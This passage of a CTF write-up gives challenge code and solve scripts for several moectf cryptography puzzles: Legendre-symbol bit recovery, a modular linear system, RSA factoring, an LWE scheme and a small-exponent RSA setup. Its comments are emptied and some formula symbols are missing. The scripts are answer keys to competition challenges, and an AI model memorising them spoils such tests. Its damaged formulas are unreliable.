<span class="built_in">pow</span>(<span class="built_in">int</span>(bit) + a, e , p)</span><br><span class="line">        ciphertext.append(n)</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(encrypt_flag(FLAG))</span><br></pre></td></tr></table></figure><p>flag</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">QRa+<span class="number">1</span></span><br><span class="line">QNRa+<span class="number">0</span></span><br></pre></td></tr></table></figure><p><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>n</mi><mrow><mo stretchy="false">(</mo><mi>p</mi><mo></mo><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mi mathvariant="normal">/</mi><mn>2</mn></mrow></msup><mo></mo><mn>1</mn><mi mathvariant="normal">/</mi><mo></mo><mn>1</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>q</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">n^{(p-1)//2}\equiv 1/-1(mod\ q)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8879999999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">p</span><span class="mbin mtight"></span><span class="mord mtight">1</span><span class="mclose mtight">)</span><span class="mord mtight">/</span><span class="mord mtight">/</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">/</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line">p = <span class="number">303597842163255391032954159827039706827</span></span><br><span class="line">a = <span class="number">34032839867482535877794289018590990371</span></span><br><span class="line">e = randprime(<span class="number">2</span>, p)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(a+<span class="number">1</span>, e*(p-<span class="number">1</span>)//<span class="number">2</span>, p))</span><br><span class="line"><span class="comment"># (1,1) (0,-1)</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">c = []</span><br><span class="line">p = <span class="number">303597842163255391032954159827039706827</span></span><br><span class="line">a = <span class="number">34032839867482535877794289018590990371</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    b=legendre_symbol(i,p)</span><br><span class="line">    <span class="keyword">if</span> b==<span class="number">1</span>:</span><br><span class="line">        flag+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(flag,<span class="number">2</span>)).decode())</span><br></pre></td></tr></table></figure><h2 id="new_system"><a class="markdownIt-Anchor" href="#new_system"></a> new_system</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long </span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;moectf&#123;???????????????&#125;&#x27;</span></span><br><span class="line">gift = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parametergenerate</span>():</span><br><span class="line">    q = getPrime(<span class="number">256</span>)</span><br><span class="line">    gift1 = randint(<span class="number">1</span>, q)</span><br><span class="line">    gift2 = (gift - gift1) % q</span><br><span class="line">    x =  randint(<span class="number">1</span>, q)</span><br><span class="line">    <span class="keyword">assert</span> gift == (gift1 + gift2) % q</span><br><span class="line">    <span class="keyword">return</span> q , x , gift1, gift2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m , q , x</span>):</span><br><span class="line">    a = randint(<span class="number">1</span>, q)</span><br><span class="line">    c = (a*x + m) % q</span><br><span class="line">    <span class="keyword">return</span> [a , c]</span><br><span class="line"></span><br><span class="line">q , x , gift1 , gift2 = parametergenerate()</span><br><span class="line"><span class="built_in">print</span>(encrypt(gift1 , q , x))</span><br><span class="line"><span class="built_in">print</span>(encrypt(gift2 , q , x))</span><br><span class="line"><span class="built_in">print</span>(encrypt(gift , q , x))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;q = <span class="subst">&#123;q&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[48152794364522745851371693618734308982941622286593286738834529420565211572487, 21052760152946883017126800753094180159601684210961525956716021776156447417961]</span></span><br><span class="line"><span class="string">[48649737427609115586886970515713274413023152700099032993736004585718157300141, 6060718815088072976566240336428486321776540407635735983986746493811330309844]</span></span><br><span class="line"><span class="string">[30099883325957937700435284907440664781247503171217717818782838808179889651361, 85333708281128255260940125642017184300901184334842582132090488518099650581761]</span></span><br><span class="line"><span class="string">q = 105482865285555225519947662900872028851795846950902311343782163147659668129411</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>1</mn><mo>=</mo><mi>a</mi><mn>1</mn><mo></mo><mi>x</mi><mo>+</mo><mi>g</mi><mn>1</mn><mtext></mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>q</mi></mrow><annotation encoding="application/x-tex">c1=a1*x+g1modq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord">1</span><span class="mord"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>2</mn><mo>=</mo><mi>a</mi><mn>2</mn><mo></mo><mi>x</mi><mo>+</mo><mi>g</mi><mn>2</mn><mtext></mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>q</mi></mrow><annotation encoding="application/x-tex">c2=a2*x+g2modq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord">2</span><span class="mord"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>3</mn><mo>=</mo><mi>a</mi><mn>3</mn><mo></mo><mi>x</mi><mo>+</mo><mi>g</mi><mn>1</mn><mo>+</mo><mi>g</mi><mn>2</mn><mtext></mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>q</mi></mrow><annotation encoding="application/x-tex">c3=a3*x+g1+g2modq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord">2</span><span class="mord"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>=</mo><mo stretchy="false">(</mo><mi>c</mi><mn>3</mn><mo></mo><mi>c</mi><mn>2</mn><mo></mo><mi>c</mi><mn>1</mn><mo stretchy="false">)</mo><mo></mo><mo stretchy="false">(</mo><mi>a</mi><mn>3</mn><mo></mo><mi>a</mi><mn>2</mn><mo></mo><mi>a</mi><mn>1</mn><msup><mo stretchy="false">)</mo><mrow><mo></mo><mn>1</mn></mrow></msup><mtext></mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>q</mi></mrow><annotation encoding="application/x-tex">x=(c3-c2-c1)*(a3-a2-a1)^{-1}modq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">a</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a1, c1 = (<span class="number">48152794364522745851371693618734308982941622286593286738834529420565211572487</span>,</span><br><span class="line">          <span class="number">21052760152946883017126800753094180159601684210961525956716021776156447417961</span>)</span><br><span class="line">a2, c2 = (<span class="number">48649737427609115586886970515713274413023152700099032993736004585718157300141</span>,</span><br><span class="line">          <span class="number">6060718815088072976566240336428486321776540407635735983986746493811330309844</span>)</span><br><span class="line">a3, c3 = (<span class="number">30099883325957937700435284907440664781247503171217717818782838808179889651361</span>,</span><br><span class="line">          <span class="number">85333708281128255260940125642017184300901184334842582132090488518099650581761</span>)</span><br><span class="line">q = <span class="number">105482865285555225519947662900872028851795846950902311343782163147659668129411</span></span><br><span class="line">x = (c3-c2-c1)*inverse(a3-a2-a1, q) % q</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes((c3-a3*x % q)).decode())</span><br></pre></td></tr></table></figure><h2 id="rsa_revenge"><a class="markdownIt-Anchor" href="#rsa_revenge"></a> RSA_revenge</h2><p><a href="https://lazzzaro.github.io/2020/12/06/match-RoarCTF-2020/index.html#Reverse">https://lazzzaro.github.io/2020/12/06/match-RoarCTF-2020/index.html#Reverse</a><br /><code>p q</code><code>emirp</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">141326884939079067429645084585831428717383389026212274986490638181168709713585245213459139281395768330637635670530286514361666351728405851224861268366256203851725349214834643460959210675733248662738509224865058748116797242931605149244469367508052164539306170883496415576116236739853057847265650027628600443901</span></span><br><span class="line">c = <span class="number">47886145637416465474967586561554275347396273686722042112754589742652411190694422563845157055397690806283389102421131949492150512820301748529122456307491407924640312270962219946993529007414812671985960186335307490596107298906467618684990500775058344576523751336171093010950665199612378376864378029545530793597</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">t</span>(<span class="params">a, b, k</span>):</span><br><span class="line">    <span class="comment"># sqrt(n)5122, 256</span></span><br><span class="line">    <span class="keyword">if</span> k == <span class="number">256</span>:</span><br><span class="line">        <span class="keyword">if</span> a*b == n:</span><br><span class="line">            <span class="built_in">print</span>(a, b)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">            <span class="comment"># </span></span><br><span class="line">            a1 = a + i*(<span class="number">2</span>**k) + j*(<span class="number">2</span>**(<span class="number">511</span>-k))</span><br><span class="line">            b1 = b + j*(<span class="number">2</span>**k) + i*(<span class="number">2</span>**(<span class="number">511</span>-k))</span><br><span class="line">            <span class="keyword">if</span> a1*b1 &gt; n:</span><br><span class="line">                <span class="comment"># a1b1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> (a1+(<span class="number">2</span>**(<span class="number">511</span>-k)))*(b1+(<span class="number">2</span>**(<span class="number">511</span>-k))) &lt; n:</span><br><span class="line">                <span class="comment"># a1b1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ((a1*b1) % (<span class="number">2</span>**(k+<span class="number">1</span>))) != (n % (<span class="number">2</span>**(k+<span class="number">1</span>))):</span><br><span class="line">                <span class="comment"># a1*b1k+1nk+1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">                <span class="comment"># (a1,b1)</span></span><br><span class="line">            t(a1, b1, k+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5122, </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    t(i*(<span class="number">2</span>**<span class="number">256</span>), i*(<span class="number">2</span>**<span class="number">256</span>), <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p, q = <span class="number">11660635291534613230423193509391946961264539191735481147071890944740311229658362673314192872117237108949853531941630122241060679012089130178372253390640871</span>, <span class="number">12119998731259483292178496920109290754181396164390285597126378297678818779092115139911720576157973310671490865211601201831597946479039132512609504866583931</span></span><br><span class="line"><span class="built_in">print</span>(p*q == n)</span><br><span class="line">d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)).decode())</span><br></pre></td></tr></table></figure><h2 id="no_way_to_find_the_flag"><a class="markdownIt-Anchor" href="#no_way_to_find_the_flag"></a> no_way_to_find_the_flag()</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> scipy.linalg <span class="keyword">import</span> block_diag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;moectf&#123;???????????????????&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_prime</span>(<span class="params">b</span>):</span><br><span class="line">    p = randint(<span class="number">2</span> ** (b - <span class="number">1</span>), <span class="number">2</span> ** b)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> isPrime(p):</span><br><span class="line">        p = randint(<span class="number">2</span> ** (b - <span class="number">1</span>), <span class="number">2</span> ** b)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generateSophieGermainPrime</span>(<span class="params">k</span>):</span><br><span class="line">    p = gen_prime(k - <span class="number">1</span>)</span><br><span class="line">    sp = <span class="number">2</span> * p + <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> isPrime(sp):</span><br><span class="line">        p = gen_prime(k - <span class="number">1</span>)</span><br><span class="line">        sp = <span class="number">2</span> * p + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">text2array</span>(<span class="params">txt</span>):</span><br><span class="line">    ary = []</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> txt.split(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> row.strip() != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            row = row.replace(<span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line">            ary.append([<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> row.split()])</span><br><span class="line">    <span class="keyword">return</span> np.array(ary, dtype=np.int64)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">keygen</span>(<span class="params">k</span>):</span><br><span class="line">    <span class="keyword">if</span> k &gt; <span class="number">29</span>:</span><br><span class="line">        datatype = <span class="string">&#x27;object&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        datatype = np.int64</span><br><span class="line"></span><br><span class="line">    q = generateSophieGermainPrime(k)</span><br><span class="line">    l = <span class="built_in">int</span>(np.ceil(log2(q)))</span><br><span class="line"></span><br><span class="line">    n = k</span><br><span class="line">    m = n * l</span><br><span class="line"></span><br><span class="line">    s = np.random.randint(q, size=n - <span class="number">1</span>, dtype=np.int64).astype(datatype)</span><br><span class="line">    t = np.append(s, <span class="number">1</span>)</span><br><span class="line">    e = np.rint(np.random.normal(scale=<span class="number">1.0</span>, size=m)).astype(<span class="built_in">int</span>).astype(datatype)</span><br><span class="line">    A = np.random.randint(q, size=(n - <span class="number">1</span>, m), dtype=np.int64).astype(datatype)</span><br><span class="line">    B = np.vstack((-A, np.dot(s, A) + e)) % q</span><br><span class="line"></span><br><span class="line">    check = np.dot(t, B) % q</span><br><span class="line">    okay = np.<span class="built_in">all</span>(check == (e % q))</span><br><span class="line">    <span class="keyword">if</span> okay:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Keygen check passed&quot;</span>)  </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Keygen check failed&quot;</span>)  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Keys</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, k, q, t, e, A, B, datatype</span>):</span><br><span class="line">            self.k = k</span><br><span class="line">            self.q = q</span><br><span class="line">            self.t = t</span><br><span class="line">            self.e = e</span><br><span class="line">            self.A = A</span><br><span class="line">            self.B = B</span><br><span class="line">            self.datatype = datatype</span><br><span class="line">            self.l = l</span><br><span class="line">            self.n = n</span><br><span class="line">            self.m = <span class="built_in">int</span>(m)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Keys(k, q, t, e, A, B, datatype)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">buildGadget</span>(<span class="params">l, n</span>):</span><br><span class="line">    g = <span class="number">2</span> ** np.arange(l)</span><br><span class="line">    <span class="keyword">return</span> block_diag(*[g <span class="keyword">for</span> null <span class="keyword">in</span> <span class="built_in">range</span>(n)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">keys, message</span>):</span><br><span class="line">    R = np.random.randint(<span class="number">2</span>, size=(keys.m, keys.m), dtype=np.int64).astype(keys.datatype)</span><br><span class="line">    G = buildGadget(keys.l, keys.n)</span><br><span class="line">    <span class="keyword">return</span> (np.dot(keys.B, R) + message * G) % keys.q</span><br><span class="line"></span><br><span class="line">keys = keygen(<span class="number">16</span>)</span><br><span class="line">binary_flag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">format</span>(byte, <span class="string">&#x27;08b&#x27;</span>) <span class="keyword">for</span> byte <span class="keyword">in</span> flag)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;keys_and_ciphertexts.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">f&quot;Keys:\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;q: <span class="subst">&#123;keys.q&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;t: <span class="subst">&#123;keys.t&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;e: <span class="subst">&#123;keys.e&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;A: <span class="subst">&#123;keys.A&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;B: <span class="subst">&#123;keys.B&#125;</span>\n\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;Ciphertexts:\n&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> binary_flag:</span><br><span class="line">        ciphertext = encrypt(keys, <span class="built_in">int</span>(bit))</span><br><span class="line">        f.write(<span class="string">f&quot;<span class="subst">&#123;ciphertext&#125;</span>\n&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="one-more-bit"><a class="markdownIt-Anchor" href="#one-more-bit"></a> One more bit</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getStrongPrime, bytes_to_long, GCD, inverse</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genKey</span>(<span class="params">nbits,dbits</span>):</span><br><span class="line">    p = getStrongPrime(nbits//<span class="number">2</span>)</span><br><span class="line">    q = getStrongPrime(nbits//<span class="number">2</span>)</span><br><span class="line">    n = p*q</span><br><span class="line">    phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        d = random.getrandbits(dbits)</span><br><span class="line">        <span class="keyword">if</span> d.bit_length() == dbits:</span><br><span class="line">            <span class="keyword">if</span> GCD(d, phi) == <span class="number">1</span>:</span><br><span class="line">                e = inverse(d, phi)</span><br><span class="line">                pk = (n, e)</span><br><span class="line">                sk = (p, q, d)</span><br><span class="line">                <span class="keyword">return</span> pk, sk</span><br><span class="line"></span><br><span class="line">nbits = <span class="number">1024</span></span><br><span class="line">dbits = <span class="number">258</span></span><br><span class="line">message = pad(flag,<span class="number">16</span>)</span><br><span class="line">msg = pad(message, <span class="number">16</span>)</span><br><span class="line">m = bytes_to_long(msg)</span><br><span class="line">pk= genKey(nbits, dbits)[<span class="number">0</span>]</span><br><span class="line">n, e = pk</span><br><span class="line">ciphertext = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;data.txt&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">f&quot;pk = <span class="subst">&#123;pk&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;ciphertext = <span class="subst">&#123;ciphertext&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.close()</span><br><span class="line">pk = (<span class="number">134133840507194879124722303971806829214527933948661780641814514330769296658351734941972795427559665538634298343171712895678689928571804399278111582425131730887340959438180029645070353394212857682708370490223871309129948337487286534021548834043845658248447393803949524601871557448883163646364233913283438778267</span>, <span class="number">83710839781828547042000099822479827455150839630087752081720660846682103437904198705287610613170124755238284685618099812447852915349294538670732128599161636818193216409714024856708796982283165572768164303554014943361769803463110874733906162673305654979036416246224609509772196787570627778347908006266889151871</span>)</span><br><span class="line">ciphertext = <span class="number">73228838248853753695300650089851103866994923279710500065528688046732360241259421633583786512765328703209553157156700672911490451923782130514110796280837233714066799071157393374064802513078944766577262159955593050786044845920732282816349811296561340376541162788570190578690333343882441362690328344037119622750</span></span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo>&lt;</mo><msup><mi>N</mi><mn>0.292</mn></msup></mrow><annotation encoding="application/x-tex">d&lt;N^{0.292}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">d</span><span class="mspace" 